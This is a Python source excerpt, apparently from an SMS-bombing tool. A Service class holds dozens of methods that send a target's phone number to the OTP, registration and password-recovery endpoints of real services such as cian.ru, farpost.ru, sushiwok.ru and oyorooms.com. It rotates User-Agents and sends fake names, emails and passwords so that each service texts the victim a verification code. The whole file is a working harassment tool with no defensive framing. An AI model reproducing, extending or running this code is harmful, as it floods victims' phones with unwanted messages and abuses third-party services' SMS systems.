...
class Service():
    ...
    def benzuber(self):
        ...
        requests.post("https://app.benzuber.ru/login", data={"phone":self.phone},headers=headers_copy)
    ...
    def oyorooms(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(f"https://www.oyorooms.com/api/pwa/generateotp?phone={self.phone}&country_code=%2B7&nod=4&locale=en",headers=headers_copy)
    ...
    def plink_tech(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://plink.tech/register/", json={'phone': self.phone},headers=headers_copy)
    ...
    def zaminka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://zaimika.com/contact?action=checkSms&phone='+phone_mask(self.phone_not_pluse, "#(###)###-##-##")+'&typeCheck=check',headers=headers_copy)
    ...
    def samaraetagi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://domclick.ru/cas/rest/api/v3/users/entry/'+self.phone_not_pluse[1:]+'?registrationSmsRequired=false&source=topline', headers=headers_copy, data={})
        requests.post('https://api.domclick.ru/core/terms/api/open/v1/acceptanceRequest', headers=headers_copy)
    ...
    def farpost(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get('https://www.farpost.ru/sign/recover/helper?ajax=1&text=+'+self.phone_not_pluse+'&mode=reg&referer=https%3A%2F%2Fwww.farpost.ru%2Fsign&strongMatch=0&showSource=1&farpostOnly=0&dromOnly=0&allowQuickRestoreLinks=0', headers=headers_copy)
        requests.post('https://www.farpost.ru/sign', headers=headers_copy, data={'radio':'reg','sign':self.phone})
        requests.get(f'https://www.farpost.ru/sign/confirm?sessionGeoId=0&sign={self.phone_not_pluse}&entrance=&registration=ok&ts=1606751018', headers=headers_copy)

    def notecash(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://notecash.ru/backend/send", headers=headers_copy, data={'phone-top':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'r':None})

    def id_ykt(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://id.ykt.ru/api/v3/register/sendCode', headers=headers_copy, data={'phone': self.phone_not_pluse[1:]})

    def uteka(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://uteka.ru/rpc/?method=auth.ValidateRegister', json={"jsonrpc":"2.0","id":'1',"method":"auth.ValidateRegister","params":{"name":name(),"phone":self.phone_not_pluse,"email":email()}}, headers=headers_copy)

    def chibbis(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://szr.chibbis.ru/account/requestverificationcode',headers=headers_copy, data={"PhoneNumber":phone_mask(self.phone_not_pluse, '+#(###) ###-####'), "ResendToken":''})
    ...
    def vladimirvilkinetru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://vladimir.vilkinet.ru/runtime/sendpass/?phone={self.phone_not_pluse[1:]}', headers=headers_copy)
    ...
    def delivio(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://delivio.by/be/api/user/check', json={"phone":self.phone}, headers=headers_copy)

    def carte(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://carte.by/auth/', data={'ajax':'register', 'login':username(), 'pass':password(), 'phone':self.phone, 'company':0, 'resend':1, 'checksum':504}, headers=headers_copy)
    ...
    def bigd_host(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(f'https://bigd.host/Settings/SendPhoneVerificationCodeAjax?phoneNumber={self.phone}', headers=headers_copy)

    def cian(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        agent = user_agent()
        requests.post(f'https://api.cian.ru/sms/v1/send-code/', headers=headers_copy, json={"phone":self.phone,"type":"authenticateCode"})

    def sushiwokru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://sushiwok.ru/user/phone/validate', headers=headers_copy, json={"phone":phone_mask(self.phone_not_pluse,'+#(###)###-##-##'),"numbers":4})

    def bettery_ru(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://clientsapi02.at-resources.com/cps/superRegistration/createProcess', headers=headers, json={"fio":_ru_name_(),"password":f' {password()}',"email":email(),"emailAdvertAccepted":'true', "phoneNumber":self.phone, "webReferrer":"","advertInfo":"","platformInfo":headers_copy['User-Agent'],"promoId":"","sysId":1,"lang":"ru"})

    def pass_media(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://pass.media/api/actions/check_phone/?phone={phone_mask(self.phone_not_pluse,"+# ### ### ## ##")}', headers=headers_copy)
